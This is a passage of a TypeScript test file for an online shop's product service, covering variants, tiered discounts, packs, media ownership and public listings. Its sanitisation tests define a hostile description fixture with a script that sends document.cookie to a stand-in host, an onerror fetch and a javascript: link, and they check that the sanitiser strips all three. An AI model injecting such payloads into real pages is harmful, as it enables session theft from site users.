      expect(harness.recorded.priceTierCreateManyData).toEqual([
        { variantId: VARIANT_ID, minQuantity: 4, unitPriceGross: 4000 },
      ]);
    });
  });
});

describe("ProductsService.deleteVariant", () => {
  it("refuses to remove the last active variant of a published product", async () => {
    const harness = await buildHarness({
      productVariant: {
        findFirst: vi.fn(async () => ({
          id: VARIANT_ID,
          sku: "AK-1",
          productId: PRODUCT_ID,
          product: { status: "ACTIVE" },
        })),
        count: vi.fn(async () => 0),
      },
    });

    await expect(harness.service.deleteVariant(VARIANT_ID)).rejects.toThrow(
      /unpublish it first/,
    );
  });

  it("allows removing the last variant of a DRAFT product", async () => {
    const harness = await buildHarness({
      productVariant: {
        findFirst: vi.fn(async () => ({
          id: VARIANT_ID,
          sku: "AK-1",
          productId: PRODUCT_ID,
          product: { status: "DRAFT" },
        })),
        count: vi.fn(async () => 0),
      },
    });

    await expect(harness.service.deleteVariant(VARIANT_ID)).resolves
      .toBeUndefined();
  });

  it("allows removing a variant when siblings remain", async () => {
    const harness = await buildHarness({
      productVariant: {
        findFirst: vi.fn(async () => ({
          id: VARIANT_ID,
          sku: "AK-1",
          productId: PRODUCT_ID,
          product: { status: "ACTIVE" },
        })),
        count: vi.fn(async () => 2),
      },
    });

    await expect(harness.service.deleteVariant(VARIANT_ID)).resolves
      .toBeUndefined();
  });
});

describe("ProductsService.addVariant", () => {
  function newVariantInput(overrides: Partial<CreateVariant> = {}): CreateVariant {
    return {
      sku: "AK-2",
      name: null,
      options: {},
      priceGross: 4999 as CreateVariant["priceGross"],
      compareAtGross: null,
      currency: "EUR",
      weightGrams: 500,
      priceTiers: [],
      initialStock: 10,
      lowStockThreshold: 5,
      allowBackorder: false,
      ...overrides,
    };
  }

  /** What `readVariant` needs back after the write: a product carrying it. */
  function productWithNewVariant(stackDiscountEnabled: boolean) {
    return {
      id: PRODUCT_ID,
      taxClass: "STANDARD" as const,
      stackDiscountEnabled,
      slug: "camiseta",
      status: "DRAFT" as const,
      restrictedCountries: [],
      createdAt: new Date("2026-03-01T00:00:00.000Z"),
      updatedAt: new Date("2026-03-01T00:00:00.000Z"),
      deletedAt: null,
      translations: [],
      media: [],
      categories: [],
      addOns: [],
      packComponents: [],
      kind: "SIMPLE" as const,
      variants: [
        {
          id: VARIANT_ID,
          productId: PRODUCT_ID,
          sku: "AK-2",
          name: null,
          options: {},
          currency: "EUR",
          priceNet: 4131,
          priceTax: 868,
          priceGross: 4999,
          compareAtGross: null,
          taxRateBps: 2100,
          priceTiers: [],
          weightGrams: 500,
          isActive: true,
          version: 0,
          inventory: null,
          image: null,
          batches: [],
        },
      ],
    };
  }

  it("computes tiers from the new variant's own price on a stack-discount product", async () => {
    const harness = await buildHarness({
      product: { findFirst: vi.fn(async () => productWithNewVariant(true)) },
    });

    await harness.service.addVariant(
      PRODUCT_ID,
      newVariantInput({ priceTiers: [{ minQuantity: 2, unitPriceGross: 1 as never }] }),
      ACTOR_ID,
    );

    const [created] = harness.recorded.variantCreates;
    const tiers = created?.["priceTiers"] as {
      create: { minQuantity: number; unitPriceGross: number }[];
    };

    expect(tiers.create).toEqual([
      { minQuantity: 2, unitPriceGross: 4499 },
      { minQuantity: 3, unitPriceGross: 4249 },
      { minQuantity: 5, unitPriceGross: 3499 },
      { minQuantity: 10, unitPriceGross: 2999 },
    ]);
  });

  it("uses the submitted tiers as-is when the product's flag is off", async () => {
    const harness = await buildHarness({
      product: { findFirst: vi.fn(async () => productWithNewVariant(false)) },
    });

    await harness.service.addVariant(
      PRODUCT_ID,
      newVariantInput({ priceTiers: [{ minQuantity: 2, unitPriceGross: 4000 as never }] }),
      ACTOR_ID,
    );

    const [created] = harness.recorded.variantCreates;
    const tiers = created?.["priceTiers"] as {
      create: { minQuantity: number; unitPriceGross: number }[];
    };

    expect(tiers.create).toEqual([{ minQuantity: 2, unitPriceGross: 4000 }]);
  });
});

describe("ProductsService.update — stack discount", () => {
  /** A second variant, distinct from VARIANT_ID, to prove EVERY variant is redone. */
  const OTHER_VARIANT_ID = "ffffffff-ffff-4fff-8fff-ffffffffffff";

  it("false→true recomputes every existing variant from its own current price", async () => {
    const harness = await buildHarness(
      { product: { findUnique: vi.fn(async () => addOnHydratedProduct()) } },
      {
        productVariant: {
          findMany: vi.fn(async () => [
            { id: VARIANT_ID, priceGross: 999 },
            { id: OTHER_VARIANT_ID, priceGross: 4999 },
          ]),
        },
      },
    );

    await harness.service.update(PRODUCT_ID, { stackDiscountEnabled: true });

    expect(harness.recorded.priceTierDeleteWheres).toEqual([
      { variantId: VARIANT_ID },
      { variantId: OTHER_VARIANT_ID },
    ]);
    // 9.99 EUR and 49.99 EUR at -10/-15/-30/-40%.
    expect(harness.recorded.priceTierCreateManyData).toEqual([
      { variantId: VARIANT_ID, minQuantity: 2, unitPriceGross: 899 },
      { variantId: VARIANT_ID, minQuantity: 3, unitPriceGross: 849 },
      { variantId: VARIANT_ID, minQuantity: 5, unitPriceGross: 699 },
      { variantId: VARIANT_ID, minQuantity: 10, unitPriceGross: 599 },
      { variantId: OTHER_VARIANT_ID, minQuantity: 2, unitPriceGross: 4499 },
      { variantId: OTHER_VARIANT_ID, minQuantity: 3, unitPriceGross: 4249 },
      { variantId: OTHER_VARIANT_ID, minQuantity: 5, unitPriceGross: 3499 },
      { variantId: OTHER_VARIANT_ID, minQuantity: 10, unitPriceGross: 2999 },
    ]);
  });

  it("recomputes identically on a second true→true save (idempotent)", async () => {
    const harness = await buildHarness(
      { product: { findUnique: vi.fn(async () => addOnHydratedProduct()) } },
      {
        productVariant: {
          findMany: vi.fn(async () => [{ id: VARIANT_ID, priceGross: 999 }]),
        },
      },
    );

    await harness.service.update(PRODUCT_ID, { stackDiscountEnabled: true });
    await harness.service.update(PRODUCT_ID, { stackDiscountEnabled: true });

    const [first, second] = [
      harness.recorded.priceTierCreateManyData.slice(0, 4),
      harness.recorded.priceTierCreateManyData.slice(4, 8),
    ];

    expect(second).toEqual(first);
    expect(second).toHaveLength(4);
  });

  it("true→false clears only the boolean, leaving tier rows untouched", async () => {
    const harness = await buildHarness(
      { product: { findUnique: vi.fn(async () => addOnHydratedProduct()) } },
      {
        productVariant: {
          findMany: vi.fn(async () => [{ id: VARIANT_ID, priceGross: 999 }]),
        },
      },
    );

    await harness.service.update(PRODUCT_ID, { stackDiscountEnabled: false });

    expect(harness.recorded.productUpdates[0]?.["stackDiscountEnabled"]).toBe(false);
    expect(harness.recorded.priceTierDeleteWheres).toHaveLength(0);
    expect(harness.recorded.priceTierCreateManyData).toHaveLength(0);
  });
});

describe("ProductsService.update — packs", () => {
  const COMPONENT_A = "10000000-0000-4000-8000-000000000001";
  const COMPONENT_B = "10000000-0000-4000-8000-000000000002";
  const COMPONENT_C = "10000000-0000-4000-8000-000000000003";
  const VARIANT_A = "20000000-0000-4000-8000-000000000001";
  const VARIANT_B = "20000000-0000-4000-8000-000000000002";
  const VARIANT_C = "20000000-0000-4000-8000-000000000003";

  const THREE_COMPONENTS = [
    { id: COMPONENT_A, variantId: VARIANT_A, quantity: 1 },
    { id: COMPONENT_B, variantId: VARIANT_B, quantity: 1 },
    { id: COMPONENT_C, variantId: VARIANT_C, quantity: 1 },
  ];

  function existingProduct(kind: "SIMPLE" | "PACK") {
    return { ...hydratedProduct(), kind };
  }

  /** The ownership check the update path runs whenever `packComponents` is sent. */
  async function buildPackUpdateHarness(existingKind: "SIMPLE" | "PACK"): Promise<Harness> {
    return buildHarness({
      product: { findUnique: vi.fn(async () => existingProduct(existingKind)) },
      productVariant: {
        findFirst: vi.fn(async () => null),
        count: vi.fn(async () => 1),
        findMany: vi.fn(async () => [
          { id: VARIANT_A, productId: COMPONENT_A },
          { id: VARIANT_B, productId: COMPONENT_B },
          { id: VARIANT_C, productId: COMPONENT_C },
        ]),
      },
    });
  }

  it("writes the component list via delete-then-recreate, position becoming sortOrder", async () => {
    const harness = await buildPackUpdateHarness("SIMPLE");

    await harness.service.update(PRODUCT_ID, { kind: "PACK", packComponents: THREE_COMPONENTS });

    expect(harness.recorded.packComponentDeleteWheres).toEqual([{ packProductId: PRODUCT_ID }]);
    expect(harness.recorded.packComponentCreateManyData).toEqual([
      { packProductId: PRODUCT_ID, componentProductId: COMPONENT_A, componentVariantId: VARIANT_A, sortOrder: 0, quantity: 1 },
      { packProductId: PRODUCT_ID, componentProductId: COMPONENT_B, componentVariantId: VARIANT_B, sortOrder: 1, quantity: 1 },
      { packProductId: PRODUCT_ID, componentProductId: COMPONENT_C, componentVariantId: VARIANT_C, sortOrder: 2, quantity: 1 },
    ]);
  });

  it("editing an existing pack's components without resending kind uses the row's own kind", async () => {
    const harness = await buildPackUpdateHarness("PACK");

    await harness.service.update(PRODUCT_ID, { packComponents: THREE_COMPONENTS });

    expect(harness.recorded.packComponentCreateManyData).toHaveLength(3);
  });

  it("rejects fewer than 2 components against an EXISTING pack, kind omitted", async () => {
    const harness = await buildPackUpdateHarness("PACK");

    await expect(
      harness.service.update(PRODUCT_ID, { packComponents: THREE_COMPONENTS.slice(0, 1) }),
    ).rejects.toMatchObject({ code: "VALIDATION_FAILED" });
  });

  it("accepts exactly 2 components against an EXISTING pack (the new floor)", async () => {
    const harness = await buildPackUpdateHarness("PACK");

    await harness.service.update(PRODUCT_ID, {
      packComponents: THREE_COMPONENTS.slice(0, 2),
    });

    expect(harness.recorded.packComponentCreateManyData).toHaveLength(2);
  });

  it("turning kind away from PACK clears the component list, even unasked", async () => {
    const harness = await buildPackUpdateHarness("PACK");

    await harness.service.update(PRODUCT_ID, { kind: "SIMPLE" });

    expect(harness.recorded.packComponentDeleteWheres).toEqual([{ packProductId: PRODUCT_ID }]);
    expect(harness.recorded.packComponentCreateManyData).toEqual([]);
  });

  it("leaves pack component rows untouched when neither kind nor packComponents is sent", async () => {
    const harness = await buildPackUpdateHarness("PACK");

    await harness.service.update(PRODUCT_ID, { listed: false });

    expect(harness.recorded.packComponentDeleteWheres).toEqual([]);
    expect(harness.recorded.packComponentCreateManyData).toEqual([]);
  });

  it("rejects a pack naming itself as one of its own components", async () => {
    const harness = await buildPackUpdateHarness("SIMPLE");

    await expect(
      harness.service.update(PRODUCT_ID, {
        kind: "PACK",
        packComponents: [
          { id: COMPONENT_A, variantId: VARIANT_A, quantity: 1 },
          { id: PRODUCT_ID, variantId: VARIANT_ID, quantity: 1 },
          { id: COMPONENT_C, variantId: VARIANT_C, quantity: 1 },
        ],
      }),
    ).rejects.toMatchObject({ code: "VALIDATION_FAILED" });
  });

  it("rejects a pinned variant that does not belong to its named component product", async () => {
    const harness = await buildHarness({
      product: { findUnique: vi.fn(async () => existingProduct("SIMPLE")) },
      productVariant: {
        findFirst: vi.fn(async () => null),
        count: vi.fn(async () => 1),
        // VARIANT_B is pinned twice below and actually belongs to COMPONENT_B
        // in reality, but the update names it under COMPONENT_A.
        findMany: vi.fn(async () => [
          { id: VARIANT_A, productId: COMPONENT_A },
          { id: VARIANT_B, productId: COMPONENT_B },
          { id: VARIANT_C, productId: COMPONENT_C },
        ]),
      },
    });

    await expect(
      harness.service.update(PRODUCT_ID, {
        kind: "PACK",
        packComponents: [
          { id: COMPONENT_A, variantId: VARIANT_B, quantity: 1 },
          { id: COMPONENT_B, variantId: VARIANT_B, quantity: 1 },
          { id: COMPONENT_C, variantId: VARIANT_C, quantity: 1 },
        ],
      }),
    ).rejects.toMatchObject({ code: "VALIDATION_FAILED" });
  });
});

describe("ProductsService.getBySlugPublic", () => {
  function activeProduct(slug: string) {
    return {
      id: PRODUCT_ID,
      slug,
      status: "ACTIVE",
      taxClass: "STANDARD",
      restrictedCountries: [],
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null,
      translations: [],
      media: [],
      categories: [],
      addOns: [],
      packComponents: [],
      kind: "SIMPLE" as const,
      variants: [
        {
          id: VARIANT_ID,
          productId: PRODUCT_ID,
          sku: "AK-1",
          name: null,
          options: {},
          currency: "EUR",
          priceNet: 4131,
          priceTax: 868,
          priceGross: 4999,
          compareAtGross: null,
          taxRateBps: 2100,
          priceTiers: [],
          weightGrams: null,
          isActive: true,
          version: 0,
          inventory: null,
          image: null,
          batches: [],
        },
      ],
    };
  }

  /**
   * A renamed product must keep resolving at its old URL. Without the history
   * lookup, every inbound link, search result and shared post predating the
   * rename 404s.
   */
  it("falls back to the slug history for a renamed product", async () => {
    const findFirst = vi
      .fn()
      .mockResolvedValueOnce(null)
      .mockResolvedValueOnce(activeProduct("camiseta-nueva"));

    const harness = await buildHarness({
      product: { findFirst },
      productSlugHistory: {
        findUnique: vi.fn(async () => ({ productId: PRODUCT_ID })),
      },
    });

    const product = await harness.service.getBySlugPublic("camiseta-vieja");
    expect(product.slug).toBe("camiseta-nueva");
  });

  it("404s when neither the slug nor its history resolves", async () => {
    const harness = await buildHarness();
    await expect(harness.service.getBySlugPublic("nope")).rejects.toThrow(CatalogError);
  });

  /**
   * A product whose variants are all inactive cannot satisfy the contract's
   * non-empty `variants`, and a detail page with every buy button dead is not
   * a page worth serving.
   */
  it("404s a product with no active variant rather than serving a dead page", async () => {
    const product = activeProduct("camiseta");
    const [variant] = product.variants;
    if (variant === undefined) throw new Error("fixture");

    const harness = await buildHarness({
      product: {
        findFirst: vi.fn(async () => ({
          ...product,
          variants: [{ ...variant, isActive: false }],
        })),
      },
    });

    await expect(harness.service.getBySlugPublic("camiseta")).rejects.toThrow(CatalogError);
  });
});

describe("ProductsService.listPublic", () => {
  it("returns an empty page without hydrating when nothing matches", async () => {
    const harness = await buildHarness();

    const page = await harness.service.listPublic(
      { sort: "newest", limit: 24 },
      "es",
    );

    expect(page.items).toEqual([]);
    expect(page.hasMore).toBe(false);
    expect(page.nextCursor).toBeNull();
    // No point issuing a second query for an empty id list.
    expect(harness.prisma["product"]).toBeDefined();
  });

  /**
   * The lookahead row must not leak into the page.
   *
   * The service asks for limit+1 to learn whether a next page exists; returning
   * that extra item would render one more card than requested on every page.
   */
  it("trims the lookahead row and reports hasMore", async () => {
    const ids = Array.from({ length: 3 }, (_, index) => ({
      id: `0000000${index}-0000-4000-8000-000000000000`,
    }));

    const harness = await buildHarness({
      $queryRaw: vi.fn(async () => ids),
      product: {
        findMany: vi.fn(async () =>
          ids.slice(0, 2).map((row) => ({
            id: row.id,
            slug: `p-${row.id}`,
            status: "ACTIVE",
            taxClass: "STANDARD",
            restrictedCountries: [],
            createdAt: new Date(),
            updatedAt: new Date(),
            deletedAt: null,
            translations: [],
            media: [],
            categories: [],
            addOns: [],
            packComponents: [],
            kind: "SIMPLE" as const,
            variants: [
              {
                id: VARIANT_ID,
                productId: row.id,
                sku: "AK-1",
                name: null,
                options: {},
                currency: "EUR",
                priceNet: 4131,
                priceTax: 868,
                priceGross: 4999,
                compareAtGross: null,
                taxRateBps: 2100,
                priceTiers: [],
                weightGrams: null,
                isActive: true,
                version: 0,
                inventory: null,
                image: null,
                batches: [],
              },
            ],
          })),
        ),
      },
    });

    const page = await harness.service.listPublic({ sort: "newest", limit: 2 }, "es");

    expect(page.items).toHaveLength(2);
    expect(page.hasMore).toBe(true);
    expect(page.nextCursor).toBe(ids[1]?.id);
  });

  it("rejects a malformed raw result rather than trusting it", async () => {
    const harness = await buildHarness({
      $queryRaw: vi.fn(async () => [{ id: 12345 }]),
    });

    // Raw query output is external data: parsed, never cast.
    await expect(
      harness.service.listPublic({ sort: "newest", limit: 24 }, "es"),
    ).rejects.toThrow();
  });
});

// ---------------------------------------------------------------------------
// Media
// ---------------------------------------------------------------------------

/**
 * The row `getByIdAdmin` reads back after every media write. Empty relations are
 * enough: these tests assert what the service WRITES, not how it maps.
 */
function hydratedProduct() {
  return {
    id: PRODUCT_ID,
    slug: "camiseta",
    status: "DRAFT" as const,
    taxClass: "STANDARD" as const,
    restrictedCountries: [],
    createdAt: new Date("2026-03-01T00:00:00.000Z"),
    updatedAt: new Date("2026-03-01T00:00:00.000Z"),
    deletedAt: null,
    translations: [],
    media: [],
    categories: [],
    addOns: [],
    packComponents: [],
    kind: "SIMPLE" as const,
    variants: [],
  };
}

function mediaInput(overrides: Partial<AddMedia> = {}): AddMedia {
  return {
    objectKey: "products/camiseta/hero.jpg",
    url: "https://cdn.example.test/camiseta/hero.jpg",
    alt: { es: "Camiseta doblada" },
    width: 1200,
    height: 1200,
    sortOrder: 0,
    ...overrides,
  };
}

describe("ProductsService.addMedia", () => {
  it("records a gallery image, with no variant and nothing replaced", async () => {
    const harness = await buildHarness({
      product: {
        findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "camiseta" })),
        findUnique: vi.fn(async () => hydratedProduct()),
      },
    });

    await harness.service.addMedia(PRODUCT_ID, mediaInput());

    expect(harness.recorded.mediaCreates).toEqual([
      expect.objectContaining({ productId: PRODUCT_ID, variantId: null }),
    ]);
    // A gallery holds many images, so nothing is deleted first. Deleting by
    // `variantId: null` would match every gallery row and empty the product.
    expect(harness.recorded.mediaDeleteWheres).toEqual([]);
  });

  it("attaches to the named variant, replacing the image it already had", async () => {
    const harness = await buildHarness({
      product: {
        findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "camiseta" })),
        findUnique: vi.fn(async () => hydratedProduct()),
      },
      productVariant: {
        findFirst: vi.fn(async () => ({ id: VARIANT_ID })),
        count: vi.fn(async () => 1),
      },
    });

    await harness.service.addMedia(PRODUCT_ID, mediaInput({ variantId: VARIANT_ID }));

    // Replace, not append: the unique index caps a variant at one image, so a
    // bare create over an existing one would raise P2002.
    expect(harness.recorded.mediaDeleteWheres).toEqual([{ variantId: VARIANT_ID }]);
    expect(harness.recorded.mediaCreates).toEqual([
      expect.objectContaining({ productId: PRODUCT_ID, variantId: VARIANT_ID }),
    ]);
  });

  it("refuses a variant that belongs to another product, and writes nothing", async () => {
    // The real query returns null for a foreign variant BECAUSE of the
    // productId clause asserted below; the stub reproduces that outcome.
    const findVariant = vi.fn(async () => null);
    const harness = await buildHarness({
      product: {
        findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "camiseta" })),
        findUnique: vi.fn(async () => hydratedProduct()),
      },
      productVariant: { findFirst: findVariant, count: vi.fn(async () => 1) },
    });

    await expect(
      harness.service.addMedia(PRODUCT_ID, mediaInput({ variantId: FOREIGN_VARIANT_ID })),
    ).rejects.toThrow(CatalogError);

    // Scoped to THIS product — the whole ownership check. Without the
    // productId clause an admin holding one product's id could hang an asset
    // off another product's variant by guessing a uuid.
    expect(findVariant).toHaveBeenCalledWith({
      where: { id: FOREIGN_VARIANT_ID, productId: PRODUCT_ID, deletedAt: null },
      select: { id: true },
    });
    expect(harness.recorded.mediaCreates).toEqual([]);
    expect(harness.recorded.mediaDeleteWheres).toEqual([]);
    expect(harness.recorded.outbox).toEqual([]);
  });

  it("enqueues a storefront purge for a variant image", async () => {
    const harness = await buildHarness({
      product: {
        findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "camiseta" })),
        findUnique: vi.fn(async () => hydratedProduct()),
      },
      productVariant: {
        findFirst: vi.fn(async () => ({ id: VARIANT_ID })),
        count: vi.fn(async () => 1),
      },
    });

    await harness.service.addMedia(PRODUCT_ID, mediaInput({ variantId: VARIANT_ID }));

    expect(harness.recorded.outbox).toHaveLength(1);
    const purge = harness.recorded.outbox[0];
    expect(purge?.topic).toBe(REVALIDATION_TOPIC);
    // Read the key rather than matching with `expect.objectContaining`. That
    // helper returns `any`, which is harmless as an ARGUMENT (see the calls
    // above) but is an unsafe assignment the moment it becomes a property of an
    // object literal. `payload` is `Record<string, unknown>`, so indexing it
    // yields `unknown` and asserts just as precisely with nothing suppressed.
    expect(purge?.payload["reason"]).toBe(CATALOG_TOPICS.productUpdated);
  });

  it("reports the product missing before it looks at the variant", async () => {
    const findVariant = vi.fn(async () => ({ id: VARIANT_ID }));
    const harness = await buildHarness({
      product: {
        findFirst: vi.fn(async () => null),
        findUnique: vi.fn(async () => hydratedProduct()),
      },
      productVariant: { findFirst: findVariant, count: vi.fn(async () => 1) },
    });

    await expect(
      harness.service.addMedia(PRODUCT_ID, mediaInput({ variantId: VARIANT_ID })),
    ).rejects.toThrow(/Product not found/);
    expect(findVariant).not.toHaveBeenCalled();
  });
});

describe("ProductsService.removeMedia", () => {
  it("deletes scoped by product AND media id, for either kind of image", async () => {
    const harness = await buildHarness({
      product: {
        findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "camiseta" })),
        findUnique: vi.fn(async () => hydratedProduct()),
      },
    });

    await harness.service.removeMedia(PRODUCT_ID, MEDIA_ID);

    // No variantId in the filter, deliberately: a variant image keeps its
    // productId, so the one ownership-scoped delete removes both kinds.
    expect(harness.recorded.mediaDeleteWheres).toEqual([
      { id: MEDIA_ID, productId: PRODUCT_ID },
    ]);
    expect(harness.recorded.outbox).toHaveLength(1);
    const purge = harness.recorded.outbox[0];
    expect(purge?.topic).toBe(REVALIDATION_TOPIC);
    // Read the key rather than matching with `expect.objectContaining`. That
    // helper returns `any`, which is harmless as an ARGUMENT (see the calls
    // above) but is an unsafe assignment the moment it becomes a property of an
    // object literal. `payload` is `Record<string, unknown>`, so indexing it
    // yields `unknown` and asserts just as precisely with nothing suppressed.
    expect(purge?.payload["reason"]).toBe(CATALOG_TOPICS.productUpdated);
  });

  it("reports not found — and purges nothing — when the asset is another product's", async () => {
    const harness = await buildHarness(
      {
        product: {
          findFirst: vi.fn(async () => ({ id: PRODUCT_ID, slug: "camiseta" })),
          findUnique: vi.fn(async () => hydratedProduct()),
        },
      },
      {
        mediaAsset: {
          create: vi.fn(async () => ({})),
          // The productId clause matched nothing, which is what a guessed id
          // from another product looks like.
          deleteMany: vi.fn(async () => ({ count: 0 })),
        },
      },
    );

    await expect(harness.service.removeMedia(PRODUCT_ID, MEDIA_ID)).rejects.toThrow(
      /Media not found/,
    );
    expect(harness.recorded.outbox).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Description sanitisation, and reporting that it happened
// ---------------------------------------------------------------------------

/**
 * The recorded Prisma payloads are parsed, never cast.
 *
 * The same rule the service applies to raw query rows applies to a test reading
 * back what the service wrote: a `as { description: string }` would keep passing
 * after the write shape changed underneath it.
 */
const createdTranslationsSchema = z.object({
  translations: z.object({
    create: z.array(z.object({ locale: z.string(), description: z.string() })),
  }),
});

const translationUpsertSchema = z.object({
  create: z.object({ locale: z.string(), description: z.string() }),
  update: z.object({ description: z.string() }),
});

/** Everything an admin could paste that must not survive into the column. */
const HOSTILE_DESCRIPTION =
  '<p>Camiseta <strong>pura</strong></p>' +
  '<script>fetch("https://evil.test?c="+document.cookie)</script>' +
  '<img src=x onerror="fetch(\'https://evil.test\')">' +
  '<a href="javascript:alert(1)">oferta</a>';

function addOnHydratedProduct() {
  return {
    id: PRODUCT_ID,
    slug: "shaker",
    status: "ACTIVE" as const,
    taxClass: "STANDARD" as const,
    restrictedCountries: [],
    listed: false,
    createdAt: new Date("2026-03-01T00:00:00.000Z"),
    updatedAt: new Date("2026-03-01T00:00:00.000Z"),
    deletedAt: null,
    translations: [],
    media: [],
    categories: [],
    addOns: [],
    packComponents: [],
    kind: "SIMPLE" as const,
    variants: [
      {
        id: VARIANT_ID,
        productId: PRODUCT_ID,
        sku: "AK-SHAKER",
        name: null,
        options: {},
        currency: "EUR",
        priceNet: 826,
        priceTax: 173,
        priceGross: 999,
        compareAtGross: null,
        taxRateBps: 2100,
        priceTiers: [],
        weightGrams: 120,
        isActive: true,
        version: 0,
        inventory: null,
        image: null,
        batches: [],
      },
    ],
  };
}

describe("ProductsService — description sanitisation on write", () => {
  async function harnessReadingBack(): Promise<Harness> {
    return buildHarness({
      product: { findUnique: vi.fn(async () => addOnHydratedProduct()) },
    });
  }

  /**
   * THE STORED COPY IS THE AUTHORITATIVE ONE.
   *
   * The storefront sanitises again at render, and that is defence in depth
   * rather than the primary control: rows written before this existed, and rows
   * written by a future consumer of the same column, only inherit the guarantee
   * if the column itself is clean.
   */
  it("stores a description stripped of script, event handlers and javascript: hrefs", async () => {
    const harness = await harnessReadingBack();

    await harness.service.create(
      createInput({
        translations: [
          {
            locale: "es",
            name: "Camiseta",
            shortDescription: "corta",
            description: HOSTILE_DESCRIPTION,
          },
        ],
      }),
      ACTOR_ID,
    );

    const data = createdTranslationsSchema.parse(harness.recorded.productCreates[0]);
    const stored = data.translations.create[0]?.description ?? "";

    expect(stored).not.toContain("<script");
    // The CONTENTS go too, not just the tag — otherwise the payload survives as
    // visible text and a second consumer that renders it unescaped is exploited.
    expect(stored).not.toContain("document.cookie");
    expect(stored).not.toContain("onerror");
    expect(stored).not.toContain("javascript:");
    expect(stored).not.toContain("<img");
    // The legitimate markup an admin actually wrote is untouched.
    expect(stored).toContain("<strong>pura</strong>");
  });

  it("names the locales it rewrote, so the change is not silent", async () => {
    const harness = await harnessReadingBack();

    const result = await harness.service.create(
      createInput({
        translations: [
          {
            locale: "es",
            name: "Camiseta",
            shortDescription: "corta",
            description: HOSTILE_DESCRIPTION,
          },
          {
            locale: "en",
            name: "Tee",
            shortDescription: "short",
            description: "<p>Nothing to remove</p>",
          },
        ],
      }),
      ACTOR_ID,
    );

    // Only the locale that actually changed. Reporting both would send an admin
    // hunting through copy the sanitiser never touched.
    expect(result.sanitizedLocales).toEqual(["es"]);
  });

  it("reports nothing when the submitted description was already safe", async () => {
    const harness = await harnessReadingBack();

    const result = await harness.service.create(
      createInput({
        translations: [
          {
            locale: "es",
            name: "Camiseta",
            shortDescription: "corta",
            description: "<p>Camiseta oversize de algodón</p>",
          },
        ],
      }),
      ACTOR_ID,
    );

    // Absence is the signal the controller relies on: no locales, no header.
    expect(result.sanitizedLocales).toEqual([]);
  });

  it("sanitises on update too, not only on create", async () => {
    const harness = await harnessReadingBack();

    const result = await harness.service.update(PRODUCT_ID, {
      translations: [
        {
          locale: "es",
          name: "Camiseta",
          shortDescription: "corta",
          description: HOSTILE_DESCRIPTION,
        },
      ],
    });

    const upsert = translationUpsertSchema.parse(harness.recorded.translationUpserts[0]);

    expect(upsert.create.description).not.toContain("<script");
    // BOTH branches of the upsert. Sanitising only `create` leaves every EDIT of
    // an existing translation unguarded, which is the common path.
    expect(upsert.update.description).not.toContain("<script");
    expect(result.sanitizedLocales).toEqual(["es"]);
  });

  /**
   * `shortDescription` renders as plain text, so escaping it would turn an
   * admin's literal "10 < 20" into a visible "10 &lt; 20". Escaping is right for
   * `description` for exactly the reason it is wrong here.
   */
  it("leaves shortDescription byte-identical", async () => {
    const harness = await harnessReadingBack();

    await harness.service.create(
      createInput({
        translations: [
          {
            locale: "es",
            name: "Camiseta",
            shortDescription: "10 < 20 & 5 > 1",
            description: "<p>ok</p>",
          },
        ],
      }),
      ACTOR_ID,
    );

    const data = z
      .object({
        translations: z.object({
          create: z.array(z.object({ shortDescription: z.string() })),
        }),
      })
      .parse(harness.recorded.productCreates[0]);

    expect(data.translations.create[0]?.shortDescription).toBe("10 < 20 & 5 > 1");
  });
});

// ---------------------------------------------------------------------------
// LISTED vs ADD-ON
// ---------------------------------------------------------------------------

/** The bound statement the service handed to Postgres. Parsed, not cast. */
const boundQuerySchema = z.object({ sql: z.string(), values: z.array(z.unknown()) });

async function harnessCapturingSql(): Promise<{
  harness: Harness;
  queryRaw: ReturnType<typeof spyQueryRaw>;
}> {
  const queryRaw = spyQueryRaw();
  const harness = await buildHarness({ $queryRaw: queryRaw });
  return { harness, queryRaw };
}

/**
 * Typed through `vi.fn`'s generic rather than through a declared parameter: the
 * recorded call has to be `unknown` (a no-argument implementation records
 * `never`, and `calls[0]?.[0]` then cannot be parsed), and a parameter written
 * only to carry that type is an unused binding this repo lints as an error.
 */
function spyQueryRaw() {
  return vi.fn<(statement: unknown) => Promise<{ id: string }[]>>(async () => []);
}

describe("ProductsService.listPublic — the add-on exclusion", () => {
  it("asks Postgres for listed products only", async () => {
    const { harness, queryRaw } = await harnessCapturingSql();

    await harness.service.listPublic({ sort: "newest", limit: 24 }, "es");

    const statement = boundQuerySchema.parse(queryRaw.mock.calls[0]?.[0]);

    expect(statement.sql).toContain("p.listed =");
    expect(statement.values).toContain(true);
    expect(statement.values).not.toContain(false);
  });

  /**
   * The narrowing is not a parameter, and this is the test that says so.
   *
   * `ProductListQuery` has no member that reaches the visibility filter, so
   * there is nothing to pass; if one is ever added, this assertion is where the
   * consequence shows up rather than in production.
   */
  it("pins the audience regardless of what the caller sent", async () => {
    const { harness, queryRaw } = await harnessCapturingSql();

    await harness.service.listPublic(
      { sort: "price_asc", limit: 5, search: "shaker", category: "accesorios" },
      "en",
    );

    const statement = boundQuerySchema.parse(queryRaw.mock.calls[0]?.[0]);

    expect(statement.values).toContain(true);
    expect(statement.values).toContain("ACTIVE");
  });
});

describe("ProductsService.listPublicAddOns", () => {
  it("returns add-ons and nothing else", async () => {
    const { harness, queryRaw } = await harnessCapturingSql();

    await harness.service.listPublicAddOns({ locale: "es", limit: 12 }, "es");

    const statement = boundQuerySchema.parse(queryRaw.mock.calls[0]?.[0]);

    expect(statement.sql).toContain("p.listed =");
    expect(statement.values).toContain(false);
    // It is not a back door to drafts or deleted rows either: an add-on gets
    // exactly the protections an ordinary public listing gets.
    expect(statement.values).toContain("ACTIVE");
    expect(statement.sql).toContain('p."deletedAt" IS NULL');
    expect(statement.sql).toContain('v2."isActive" = TRUE');
  });

  it("orders by name rather than by recency, so the strip does not reshuffle", async () => {
    const { harness, queryRaw } = await harnessCapturingSql();

    await harness.service.listPublicAddOns({ locale: "es", limit: 12 }, "es");

    const statement = boundQuerySchema.parse(queryRaw.mock.calls[0]?.[0]);

    expect(statement.sql).toContain("ORDER BY candidate.sort_name ASC");
  });

  it("serves the narrow PublicProduct shape, never the wide one", async () => {
    const harness = await buildHarness({
      $queryRaw: vi.fn(async () => [{ id: PRODUCT_ID }]),
